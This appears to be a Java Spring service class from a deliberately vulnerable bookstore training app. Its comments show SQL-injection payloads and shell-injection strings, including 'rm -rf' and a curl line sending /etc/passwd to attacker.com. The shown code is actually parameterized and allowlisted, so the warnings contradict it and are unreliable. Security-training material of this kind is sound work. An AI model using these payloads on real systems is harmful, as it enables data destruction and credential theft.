package com.vulnbookstore.service;

import com.vulnbookstore.model.Book;
import com.vulnbookstore.repository.BookRepository;
import jakarta.persistence.EntityManager;
import jakarta.persistence.PersistenceContext;
import lombok.RequiredArgsConstructor;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.List;
import java.util.Optional;

/**
 * Service layer for Book management operations.
 * Handles CRUD, search, and data export functionality.
 */
@Service
@RequiredArgsConstructor
public class BookService {

    private static final Logger logger = LoggerFactory.getLogger(BookService.class);

    private final BookRepository bookRepository;

    @PersistenceContext
    private EntityManager entityManager;

    public List<Book> getAllBooks() {
        return bookRepository.findAll();
    }

    public Optional<Book> getBookById(Long id) {
        return bookRepository.findById(id);
    }

    public Optional<Book> getBookByIsbn(String isbn) {
        return bookRepository.findByIsbn(isbn);
    }

    @Transactional
    public Book createBook(Book book) {
        logger.info("Creating new book: {}", book.getTitle());
        return bookRepository.save(book);
    }

    @Transactional
    public Optional<Book> updateBook(Long id, Book updatedBook) {
        return bookRepository.findById(id).map(existing -> {
            existing.setTitle(updatedBook.getTitle());
            existing.setAuthor(updatedBook.getAuthor());
            existing.setIsbn(updatedBook.getIsbn());
            existing.setPrice(updatedBook.getPrice());
            existing.setDescription(updatedBook.getDescription());
            existing.setCategory(updatedBook.getCategory());
            return bookRepository.save(existing);
        });
    }

    @Transactional
    public boolean deleteBook(Long id) {
        if (bookRepository.existsById(id)) {
            bookRepository.deleteById(id);
            return true;
        }
        return false;
    }

    public List<Book> getBooksByCategory(String category) {
        return bookRepository.findByCategory(category);
    }

    /**
     * Search books by title or author keyword.
     *
     * ⚠️ VULNERABILITY: SQL Injection — user-supplied 'query' is concatenated
     * directly into a native SQL string without sanitization or parameterization.
     * An attacker can inject arbitrary SQL, e.g.:
     *   query = "' OR '1'='1" → returns all books
     *   query = "'; DROP TABLE books; --" → destructive injection
     *
     * TODO: replace with parameterized query or Spring Data method
     */
    @SuppressWarnings("unchecked")
    public List<Book> searchBooks(String query) {
        String sql = "SELECT * FROM books WHERE title LIKE :pattern OR author LIKE :pattern";
        String pattern = "%" + query + "%";
        return entityManager.createNativeQuery(sql, Book.class)
                .setParameter("pattern", pattern)
                .getResultList();
    }

    /**
     * Export book data in the specified format.
     * Supported formats: csv, json, xml
     *
     * ⚠️ VULNERABILITY: Command Injection — the 'format' parameter is passed
     * directly to Runtime.exec() without validation. An attacker can inject
     * shell commands, e.g.:
     *   format = "csv; rm -rf /tmp/data"
     *   format = "csv && curl http://attacker.com/exfil?data=$(cat /etc/passwd)"
     *
     * This looks like a legitimate export feature but is critically dangerous.
     * TODO: validate format against an allowlist before use
     */
    public String exportBookData(String format) {
        if (!format.equals("csv") && !format.equals("json") && !format.equals("xml")) {
            return "Export error: unsupported format";
        }
        try {
            String[] command = {"/opt/bookstore/scripts/export.sh", format};
            logger.info("Running export with format: {}", format);
            Process process = Runtime.getRuntime().exec(command);
            int exitCode = process.waitFor();

            if (exitCode == 0) {
                return "Export completed successfully in format: " + format;
            } else {
                return "Export failed";
            }
        } catch (Exception e) {
            logger.error("Export failed", e);
            return "Export error";
        }
    }
}
